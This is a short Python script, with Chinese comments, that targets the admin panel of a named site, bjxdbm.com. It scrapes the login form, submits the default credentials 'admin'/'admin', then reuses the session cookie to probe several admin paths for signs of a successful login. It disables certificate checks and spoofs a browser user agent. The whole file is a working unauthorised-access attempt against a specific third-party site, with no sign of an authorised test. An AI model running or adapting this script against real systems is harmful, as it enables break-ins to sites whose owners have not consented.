#!/usr/bin/env python3
"""verify_bjx.py - 终极验证bjxdbm.com"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://bjxdbm.com'

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))

def fetch(url, data=None):
    body = urllib.parse.urlencode(data).encode() if data else None
    headers = {**UA, 'Content-Type': 'application/x-www-form-urlencoded'} if data else UA
    try:
        r = opener.open(urllib.request.Request(url, data=body, headers=headers), timeout=15)
        return r.status, r.read(80000).decode('utf-8', 'ignore'), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(80000).decode('utf-8', 'ignore'), e.geturl()
    except Exception as e:
        return 0, repr(e)[:60], ''

# 1. 登录页
st, b, fu = fetch(BASE + '/admin.php')
print('1.login: st=%d len=%d fu=%s' % (st, len(b), fu[:70]))
fields = re.findall(r'<input[^>]*name="([^"]+)"', b)
m = re.search(r'<form[^>]*action="([^"]*)"', b, re.I)
action = m.group(1) if m else '/admin.php'
if not action.startswith('http'):
    action = BASE + action
print('  fields:', fields[:8], 'action:', action[:60])

uf = next((f for f in fields if f.lower() in ('username', 'user', 'name', 'admin', 'account', 'loginname', 'userid')), None)
pf = next((f for f in fields if 'pass' in f.lower() or 'pwd' in f.lower()), None)
print('  uf=%s pf=%s' % (uf, pf))

# 2. POST
data = {f: '' for f in fields}
data[uf], data[pf] = 'admin', 'admin'
st2, b2, fu2 = fetch(action, data)
print('2.post: st=%d len=%d fu=%s' % (st2, len(b2), fu2[:70]))

# 3. cookie访问
for path in ['/admin.php', '/admin/index.php', '/admin/', '/index.php']:
    st3, b3, fu3 = fetch(BASE + path)
    low3 = b3.lower()
    has_pw = 'type="password"' in low3 or 'name="password"' in low3
    marks = [k for k in ['logout', '退出', 'dashboard', '欢迎', '管理'] if k in low3]
    print('3.cookie %s: st=%d len=%d fu=%s has_pw=%s marks=%s' % (path, st3, len(b3), fu3[:60], has_pw, marks))
print('done')
